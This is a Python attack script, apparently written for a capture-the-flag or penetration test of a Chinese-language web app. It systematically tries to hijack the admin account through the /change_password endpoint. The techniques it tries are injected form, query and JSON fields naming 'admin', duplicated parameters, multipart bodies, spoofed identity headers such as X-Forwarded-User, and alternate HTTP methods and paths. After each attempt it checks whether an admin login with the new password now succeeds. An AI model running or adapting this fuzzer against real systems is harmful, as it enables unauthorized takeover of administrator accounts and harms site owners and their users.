import lib, time, json, urllib.parse, itertools

BASE = lib.BASE
results = []


def try_admin_login(pw):
    op = lib.sess()
    s, h, b = lib.req(op, "/login", {"username": "admin", "password": pw}, "POST")
    t = lib.clean(b)
    return ("我的账户" in t), t[:120]


def attempt(tag, build):
    op = lib.sess()
    u = "f%d" % (int(time.time() * 1000) % 1000000)
    lib.reg(op, u, "pw123456")
    lib.login(op, u, "pw123456")
    NEW = "NP" + str(abs(hash(tag)) % 100000)
    s, h, b = build(op, NEW)
    ok, t = try_admin_login(NEW)
    # also verify own password changed?
    op2 = lib.sess()
    s2, h2, b2 = lib.req(op2, "/login", {"username": u, "password": NEW}, "POST")
    own = "我的账户" in lib.clean(b2)
    print(f"{tag:46s} admin={ok} own_changed={own} resp={lib.clean(b)[:60]}")
    if ok:
        print("   *** HIT ***", tag)


def f_form_extra(key):
    return lambda op, NEW: lib.req(op, "/change_password",
                                   {"new_password": NEW, key: "admin"}, "POST")


def f_qs(key):
    return lambda op, NEW: lib.req(op, f"/change_password?{key}=admin",
                                   {"new_password": NEW}, "POST")


for key in ["username", "user", "name", "account", "target", "target_user",
            "uid", "id", "who", "uname", "owner", "user_name", "nickname",
            "old_username", "new_username", "admin", "as", "for", "u"]:
    attempt("form+" + key, f_form_extra(key))
    attempt("qs+" + key, f_qs(key))

# JSON body
def f_json(op, NEW):
    body = json.dumps({"new_password": NEW, "username": "admin"}).encode()
    return lib.req(op, "/change_password", raw_body=body, ctype="application/json")
attempt("json{new_password,username}", f_json)

def f_json2(op, NEW):
    body = json.dumps({"new_password": NEW, "user": "admin"}).encode()
    return lib.req(op, "/change_password", raw_body=body, ctype="application/json")
attempt("json{new_password,user}", f_json2)

# duplicate params (HPP)
def f_hpp(op, NEW):
    body = f"new_password={NEW}&new_password=zzz".encode()
    return lib.req(op, "/change_password", raw_body=body)
attempt("hpp new_password x2", f_hpp)

def f_hpp2(op, NEW):
    body = f"new_password=zzz&new_password={NEW}".encode()
    return lib.req(op, "/change_password", raw_body=body)
attempt("hpp new_password x2 rev", f_hpp2)

# multipart
def f_mp(op, NEW):
    b = (f"--x\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\nadmin\r\n"
         f"--x\r\nContent-Disposition: form-data; name=\"new_password\"\r\n\r\n{NEW}\r\n--x--\r\n")
    return lib.req(op, "/change_password", raw_body=b.encode(),
                   ctype="multipart/form-data; boundary=x")
attempt("multipart username+new_password", f_mp)

# headers
def f_hdr(name):
    return lambda op, NEW: lib.req(op, "/change_password", {"new_password": NEW}, "POST",
                                   hdrs={name: "admin"})
for name in ["X-Username", "X-User", "X-Forwarded-User", "X-Forwarded-For", "X-Account"]:
    attempt("hdr " + name, f_hdr(name))

# methods
attempt("GET /change_password?new_password=", lambda op, NEW: lib.req(
    op, "/change_password?new_password=" + NEW + "&username=admin", method="GET"))
attempt("PUT /change_password", lambda op, NEW: lib.req(
    op, "/change_password", {"new_password": NEW, "username": "admin"}, "PUT"))
attempt("POST /change_password/admin", lambda op, NEW: lib.req(
    op, "/change_password/admin", {"new_password": NEW}, "POST"))
attempt("POST /change_password?username=admin (form only)", lambda op, NEW: lib.req(
    op, "/change_password?username=admin", {"new_password": NEW}, "POST"))
